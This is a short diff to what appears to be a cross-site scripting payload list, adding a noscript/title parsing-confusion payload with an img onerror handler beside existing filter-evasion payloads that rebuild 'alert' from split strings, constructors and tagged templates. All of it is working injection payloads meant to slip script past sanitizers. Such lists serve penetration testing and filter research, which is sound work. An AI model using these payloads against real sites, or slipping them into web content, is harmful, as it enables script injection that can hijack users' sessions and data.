@@ -196,3 +196,4 @@ constructor.constructor("aler"+"t(3)")();
 [].filter.constructor('ale'+'rt(4)')();
 top["al"+"ert"](5);
 new Function`al\ert\`6\``;
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
